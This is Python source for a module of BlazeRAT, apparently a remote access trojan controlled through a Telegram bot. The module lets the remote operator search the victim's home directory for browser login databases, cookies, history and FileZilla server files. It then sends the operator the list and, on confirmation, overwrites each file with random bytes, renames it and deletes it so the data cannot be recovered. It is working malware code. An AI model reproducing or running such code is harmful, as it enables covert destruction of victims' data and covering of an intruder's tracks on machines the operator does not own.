#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Import modules
from io import BytesIO
from telebot import types
from string import ascii_letters, digits
from os import walk, path, rename, unlink
from random import choice, randint, _urandom
from core.messages import services as Messages
from services.startup import HOME_DIRECTORY

"""
Author : LimerBoy
github.com/LimerBoy/BlazeRAT

Notes :
    The file is needed to
    clean passwords, cookies, history, credit cards from browsers.
"""

global detected
detected = []
RemoveFiles = [
    # Chromium based browsers data:
    "Local State", "Login Data", "Web Data", "Cookies", "History", "Favicons", "Shortcuts", "Top Sites",
    # Firefox based browsers data:
    "key3.db", "key4.db", "logins.json", "cookies.sqlite", "places.sqlite", "formhistory.sqlite", "permissions.sqlite", "storage.sqlite", "favicons.sqlite",
    # FileZilla servers:
    "recentservers.xml", "sitemanager.xml", "filezilla.xml",
]

""" Wipe browser data request """
def WipeBrowserDataInfo(message: dict, bot):
    global detected
    DetectFiles(HOME_DIRECTORY)
    obj = BytesIO()
    obj.write(b"This files will be removed:\n\n" +
        "\n".join(detected).encode())
    bot.send_document(
        message.chat.id, obj.getvalue(),
        caption=Messages.wipe_files_count % len(detected)
    )
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton(text=Messages.wipe_agree, callback_data="WipeYes"),
        types.InlineKeyboardButton(text=Messages.wipe_disagree, callback_data="WipeNo")
    )
    bot.send_message(message.chat.id, Messages.wipe_confirm, reply_markup=markup)

def WipeBrowserData(callback: dict, bot):
    global detected
    removed = 0
    if callback.data.endswith("Yes"):
        for file in detected:
            if ShredFile(file):
                removed += 1
        bot.send_message(callback.from_user.id, Messages.wipe_removed % removed)
    else:
        detected = []
        bot.send_message(callback.from_user.id, Messages.wipe_cancelled)

""" Detect files to delete """
def DetectFiles(dir: str) -> list:
    global detected
    detected = []
    for r, d, f in walk(dir):
        for file in f:
            if file in RemoveFiles:
                detected.append(path.join(r, file))
    detected = sorted(detected)

""" Get random file name """
def RandomFile() -> str:
    result = ""
    data = ascii_letters + digits
    for _ in range(randint(8, 16)):
        result += choice(data)
    return result

"""
Remove the data from file,
make it unrecoverable.
"""
def ShredFile(file: str, cycles = 1) -> bool:
    # Check if file exists and is not directory
    if not path.exists(file) or not path.isfile(file):
        return False
    # Shred file
    try:
        # Create random filename
        RandomFileName = RandomFile()
        # Rewrite the data of file,
        with open(file, "ba+") as delfile:
            length = delfile.tell()
            for _ in range(cycles):
                delfile.seek(0)
                delfile.write(_urandom(length))
        # Renames the file for completely remove traces
        rename(file, RandomFileName)
        # Finaly deletes the file
        unlink(RandomFileName)
    except Exception as error:
        print(error)
        return False
    else:
        return True
